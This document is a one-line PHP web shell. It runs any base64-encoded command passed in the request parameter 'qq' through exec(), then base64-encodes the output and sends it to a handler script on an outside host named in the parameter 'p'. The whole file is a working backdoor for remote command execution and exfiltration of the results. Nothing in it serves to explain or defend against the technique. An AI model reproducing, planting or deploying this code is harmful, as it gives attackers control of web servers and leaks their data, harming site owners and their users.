<?php exec(base64_decode($_REQUEST['qq']), $dd);file_get_contents('http://'.$_REQUEST['p'].'/handler.php?decodeme='.base64_encode(implode(PHP_EOL, $dd))); ?>
